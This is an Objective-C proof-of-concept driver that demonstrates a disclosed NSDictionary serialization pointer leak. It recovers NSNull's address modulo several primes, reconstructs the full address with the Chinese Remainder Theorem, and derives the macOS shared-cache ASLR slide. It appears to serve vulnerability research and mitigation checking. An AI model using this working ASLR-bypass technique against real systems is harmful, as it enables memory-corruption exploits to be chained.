#import <Foundation/Foundation.h>
#import "diagnostics.h"
#import "hash-utils.h"
#import "dict-builder.h"
#import "crt-solver.h"
#include <stdio.h>
#include <stdlib.h>
#include <mach-o/dyld.h>
#include <dlfcn.h>

// Dyld private API declarations (from mach-o/dyld_priv.h)
extern const void* _dyld_get_shared_cache_range(size_t* length);

void print_usage(const char *prog_name) {
    printf("Usage: %s\n", prog_name);
    printf("\nDemonstrates ASLR slide extraction through NSDictionary serialization.\n");
    printf("This is a proof-of-concept for the vulnerability disclosed by Project Zero.\n");
}

int main(int argc, char *argv[]) {
    (void)argc;
    (void)argv;
    @autoreleasepool {
        printf("\n");
        printf("╔════════════════════════════════════════════════════════════════╗\n");
        printf("║  NSDictionary Pointer Leak - ASLR Slide Extraction PoC        ║\n");
        printf("║  Based on Google Project Zero disclosure (Sept 2025)          ║\n");
        printf("╚════════════════════════════════════════════════════════════════╝\n");
        printf("\n");

        // Phase 0: Run diagnostics
        bool appears_vulnerable = run_diagnostics();

        // Get actual NSNull address for verification
        NSNull *null = [NSNull null];
        uintptr_t actual_address = (uintptr_t)null;
        printf("[Info] Actual NSNull address: 0x%lx\n\n", actual_address);

        // Phase 1: Attempt to leak the address using CRT
        printf("========================================\n");
        printf("Phase 1: Address Extraction via CRT\n");
        printf("========================================\n\n");

        uint64_t remainders[NUM_PRIMES];
        uint64_t moduli[NUM_PRIMES];

        // For each prime table size, build dictionaries and extract NSNull position
        for (size_t i = 0; i < NUM_PRIMES; i++) {
            uint64_t prime = TABLE_PRIMES[i];

            printf("[+] Testing with table size %llu\n", prime);

            // Build even pattern dictionary
            NSDictionary *even_dict = build_dict_with_pattern(PATTERN_EVEN, prime);
            NSArray *even_keys = extract_serialized_keys(even_dict);
            NSInteger even_pos = even_keys ? find_nsnull_position_in_keys(even_keys) : -1;
            bool even_valid = even_keys ? validate_bucket_order(even_keys, prime, PATTERN_EVEN) : false;

            printf("    Even pattern: NSNull at position %ld (%s)\n",
                   (long)even_pos, even_valid ? "order OK" : "order mismatch");

            // Build odd pattern dictionary
            NSDictionary *odd_dict = build_dict_with_pattern(PATTERN_ODD, prime);
            NSArray *odd_keys = extract_serialized_keys(odd_dict);
            NSInteger odd_pos = odd_keys ? find_nsnull_position_in_keys(odd_keys) : -1;
            bool odd_valid = odd_keys ? validate_bucket_order(odd_keys, prime, PATTERN_ODD) : false;

            printf("    Odd pattern:  NSNull at position %ld (%s)\n",
                   (long)odd_pos, odd_valid ? "order OK" : "order mismatch");

            // Calculate NSNull mod prime
            uint64_t remainder;
            if (even_valid && odd_valid &&
                calculate_nsnull_mod(prime, even_pos, odd_pos, &remainder)) {
                remainders[i] = remainder;
                moduli[i] = prime;
                printf("    NSNull mod %llu = %llu\n", prime, remainder);
            } else {
                printf("    [ERROR] Failed to calculate remainder for prime %llu\n", prime);
                remainders[i] = 0;
                moduli[i] = prime;
            }

            printf("\n");
        }

        // Apply Chinese Remainder Theorem
        printf("[+] Applying Chinese Remainder Theorem\n");

        uint64_t leaked_address;
        if (chinese_remainder_theorem(remainders, moduli, NUM_PRIMES, &leaked_address)) {
            printf("    Leaked address: 0x%llx\n", leaked_address);
            printf("    Actual address: 0x%lx\n", actual_address);

            if (leaked_address == actual_address) {
                printf("    Result: MATCH ✓\n\n");

                // Calculate ASLR slide using dyld APIs
                printf("[+] ASLR Slide Calculation\n");
                printf("    Leaked address: 0x%llx\n", leaked_address);

                // Get shared cache information
                size_t cache_length = 0;
                const void *cache_base = _dyld_get_shared_cache_range(&cache_length);

                if (cache_base != NULL) {
                    uintptr_t cache_base_addr = (uintptr_t)cache_base;
                    uintptr_t cache_end = cache_base_addr + cache_length;

                    printf("    Shared cache base:   0x%lx\n", cache_base_addr);
                    printf("    Shared cache length: 0x%zx (%zu MB)\n",
                           cache_length, cache_length / (1024 * 1024));
                    printf("    Shared cache end:    0x%lx\n", cache_end);

                    // Try to get dyld_shared_cache_slide if available (macOS 10.13+)
                    typedef intptr_t (*dyld_slide_func)(void);
                    dyld_slide_func get_slide = (dyld_slide_func)dlsym(RTLD_DEFAULT, "dyld_shared_cache_slide");

                    intptr_t actual_slide = 0;
                    bool have_slide = false;

                    if (get_slide != NULL) {
                        actual_slide = get_slide();
                        have_slide = true;
                        printf("    ASLR slide (dyld):   0x%lx (%ld bytes)\n",
                               (unsigned long)actual_slide, (long)actual_slide);
                    } else {
                        // Fallback: estimate slide from cache base
                        // Shared cache base is typically 0x180000000 + slide on arm64
                        // or 0x7fff00000000 + slide on x86_64
                        #if defined(__arm64__) || defined(__aarch64__)
                        const uintptr_t expected_base = 0x180000000ULL;
                        #else
                        const uintptr_t expected_base = 0x7fff00000000ULL;
                        #endif

                        actual_slide = (intptr_t)(cache_base_addr - expected_base);
                        printf("    ASLR slide (est):    0x%lx (%ld bytes)\n",
                               (unsigned long)actual_slide, (long)actual_slide);
                        printf("    (estimated from cache base - expected base)\n");
                    }

                    // Verify NSNull is in shared cache
                    if (leaked_address >= cache_base_addr && leaked_address < cache_end) {
                        printf("    NSNull location:     Within shared cache ✓\n");

                        // Calculate NSNull's offset from cache base
                        uint64_t offset_in_cache = leaked_address - cache_base_addr;
                        printf("    Offset in cache:     0x%llx\n", offset_in_cache);

                        // The unslid address would be the leaked address minus the slide
                        if (have_slide || actual_slide != 0) {
                            uint64_t unslid_address = leaked_address - actual_slide;
                            printf("    Unslid NSNull addr:  0x%llx\n", unslid_address);
                        }
                    } else {
                        printf("    NSNull location:     Outside shared cache\n");
                        printf("    (This is unexpected for NSNull singleton)\n");
                    }
                } else {
                    printf("    [Warning] Could not retrieve shared cache information\n");
                    printf("    Shared cache APIs may not be available on this system\n");
                }
            } else {
                printf("    Result: MISMATCH ✗\n");
                printf("    Difference: 0x%llx\n",
                       (unsigned long long)llabs((long long)leaked_address - (long long)actual_address));
                printf("\n");
                printf("    This suggests the mitigation has altered the hash behavior\n");
                printf("    or the CRT calculation needs refinement for this system.\n");
            }
        } else {
            printf("    [ERROR] Chinese Remainder Theorem calculation failed\n");
        }

        printf("\n");
        printf("========================================\n");
        printf("Analysis Complete\n");
        printf("========================================\n");

        if (appears_vulnerable && leaked_address == actual_address) {
            printf("\nConclusion: System appears vulnerable to pointer leak attack.\n");
            printf("The exact NSNull address was successfully extracted using only\n");
            printf("serialization output, demonstrating the feasibility of ASLR bypass.\n");
        } else if (!appears_vulnerable) {
            printf("\nConclusion: System appears to have mitigation in place.\n");
            printf("Hash values do not directly expose pointer addresses.\n");
        } else {
            printf("\nConclusion: Attack was unsuccessful.\n");
            printf("Either the system has partial mitigations or the PoC needs\n");
            printf("refinement for this specific macOS version.\n");
        }

        printf("\n");

        return 0;
    }
}
